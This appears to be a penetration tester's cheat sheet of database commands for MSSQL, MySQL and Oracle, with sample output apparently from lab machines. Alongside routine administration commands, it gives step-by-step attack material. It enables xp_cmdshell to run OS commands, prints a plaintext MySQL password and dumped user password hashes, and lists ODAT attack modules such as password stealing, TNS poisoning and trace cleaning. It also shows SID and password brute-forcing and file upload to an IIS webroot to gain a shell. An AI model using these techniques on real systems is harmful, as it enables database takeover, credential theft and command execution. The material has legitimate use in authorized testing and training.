Databases
---------

#Connect to database GUI in Linux
hexorbase (no good)
DBeaver (uptodate good)


Database versions
-----------------
Mysql 8.0.1.8
Mssql (2017 x64 RE/ubuntu/docker)
Postgresql 12.0
oracle 19c 

#Connect to Microsoft SQL database
/usr/bin/mssqlclient.py -p 1433 admin:m\@x.x.x.x



#Connect to Microsoft SQL database
tsql -S x.x.x.x -p 1337 -U admin
password

#List Database structure and tables
1> select * from sys.tables;
24> go

1> SELECT name FROM master.dbo.sysdatabases
2> go

1> Select * from databasename.INFORMATION_SCHEMA.TABLES
2> go

1> Select * from databasename.INFORMATION_SCHEMA.COLUMNS
2> go

1> USE databasename
2> go

1> SELECT * FROM tablename_whats_inside
2> go


#Enable shell
1> EXEC sp_configure 'show advanced options', 1;
2> go
Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
	"Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install."
(return status = 0)

1> RECONFIGURE;
2> go

1> EXEC sp_configure 'xp_cmdshell', 1;
2> go
Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
	"Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install."
(return status = 0)

1> RECONFIGURE;
2> go

2> exec xp_cmdshell 'whoami';
3> go
output
tally\sarah
NULL
(2 rows affected)
(return status = 0)
output
tally\sarah
NULL
(2 rows affected)
(return status = 0)
1> 

1> exec xp_cmdshell 'echo %CD%';
2> go
output
C:\Windows\system32
NULL
(2 rows affected)
(return status = 0)


#mysql


#Windows - MYSQL
mysql -uUSERNAME -pPASSWORD -e "command"

mysql -uharvey -p!IC4nB3Th3B3st? -e "show databases;"
Database
information_schema
internal_chat

mysql -uharvey -p!IC4nB3Th3B3st? -e "show tables;"  internal_chat
Tables_in_internal_chat
message
user


mysql -uharvey -p!IC4nB3Th3B3st? -e "select * from user;"  internal_chat 
uid	uname	passwd
1	harvey	faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3
2	bobby	e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc
3	daniel	f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c7c801


#Linux - MYSQL

#Save/Restore
mysqldump -u username -p password > db.sql
mysqldump -u username -p password < db.sql

#Repair Tables
mysqlcheck --all-databases

SELECT * FROM table

SHOW DATABASES
SHOW TABLES
SHOW FIELDS FROM table / DESCRIBE table
SHOW CREATE TABLE table
SHOW PROCESSLIST
KILL process)_number

INSERT INTO table1 (field1, field2) VALUES (value1, value2)
DELETE FROM table1

GRANT ALL PRIVILEGES on base.* TO 'user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, DELETE on base.* TO 'user'@'localhost' IDENTIFIED BY 'password';
REVOKE ALL PRIVILEGES on base.* FROM 'user'@'host''

SET PASSWORD = PASSWORD('password')
SET PASSWORD FOR 'user'@'host' = PASSWORD('password')

DROP USER 'user'@'host'

#linux root reset password
mysql stop
mysqld_safe --skip-grant-tables
UPDATE mysql.user SET password=PASSWORD('password') WHERE user='root';
mysqld start


Oracle
-----


#Login 
#XE is system identifier of database
sqlplus username/password@x.x.x.x:1521/XE

ERROR:
ORA-28002: the password will expire within 7 days


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 



#Login as SYSDBA
#XE=system identifier (find it)
sqlplus user/password@x.x.x.x:1521/XE AS SYSDBA

SQL> CREATE USER test IDENTIFIED by test; 

User created.

SQL> GRANT DBA TO test;

Grant succeeded.



#ODAT(Oracle Database Attacking Tool)
    tnscmd            to communicate with the TNS listener
    tnspoison         to exploit TNS poisoning attack
    sidguesser        to know valid SIDs
    passwordguesser   to know valid credentials
    utlhttp           to send HTTP requests or to scan ports
    httpuritype       to send HTTP requests or to scan ports
    utltcp            to scan ports
    ctxsys            to read files
    externaltable     to read files or to execute system commands/scripts
    dbmsxslprocessor  to upload files
    dbmsadvisor       to upload files
    utlfile           to download/upload/delete files
    dbmsscheduler     to execute system commands without a standard output
    java              to execute system commands
    passwordstealer   to get hashed Oracle passwords
    oradbg            to execute a bin or script
    dbmslob           to download files
    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
    smb               to capture the SMB authentication
    privesc           to gain elevated access
    cve               to exploit a CVE
    search            to search in databases, tables and columns
    unwrapper         to unwrap PL/SQL source code (no for 9i version)
    clean             clean traces and logs
python2.7 odat.py all -s x.x.x.x -d XE -U test -P test

[1] (x.x.x.x:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (x.x.x.x:1521): Testing all modules on the XE SID with the test/test account
[-] Impossible to connect to the remote database: `ORA-01017: invalid username/password; logon denied`



#System Identifier guesser
python2.7 odat.py sidguesser -s x.x.x.x

[1] (x.x.x.x:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the x.x.x.x:1521 server
 12% |######                                                   | ETA:  00:03:54 

[+] 'XE' is a valid SID. Continue...                                            
[+] 'XEXDB' is a valid SID. Continue...                                         
100% |#########################################################| Time: 00:04:37 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (x.x.x.x:1521)
100% |#########################################################| Time: 00:00:08 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (x.x.x.x:1521)
[+] 'XE' is a valid SID. Continue...                                            

100% |#########################################################| Time: 00:04:10 
[+] SIDs found on the x.x.x.x:1521 server: XE,XEXDB



#Checks against passwords/accounts odat location (can change to file)
python2.7 odat.py passwordguesser -s x.x.x.x -d XE -v

[1] (x.x.x.x:1521): Searching valid accounts on the x.x.x.x server, port 1521
18:38:24 INFO -: Loading accounts stored in the accounts/accounts.txt file
18:38:24 INFO -: 491 paired login/password loaded
18:38:24 INFO -: Searching valid accounts on x.x.x.x:1521/XE
 13% |#######                                                  | ETA:  00:25:33 
 26% |##############                                           | ETA:  00:15:59 



#If someone connects and its vulnerable can poison
python2.7 odat.py tnspoison -s x.x.x.x -d XE --poison

[1] (x.x.x.x:1521): Local proxy on port 1522 and TNS poisoning attack to x.x.x.x:1521 are starting. Waiting for connections...



#File upload
#If you can write to and exec you can get shell
#Either by uploading to IIS (aspx) or local file then executing
python2.7 odat.py utlfile -s x.x.x.x -d XE -U username -P password --sysdba --putFile "C:\\inetpub\\wwwroot\\" test.txt ~/test.txt

[1] (x.x.x.x:1521): Put the /home/RedTeam/test.txt local file in the C:\inetpub\wwwroot\ folder like test.txt on the x.x.x.x server
[+] The /home/RedTeam/test.txt file was created on the C:\inetpub\wwwroot\ directory on the x.x.x.x server like the test.txt file
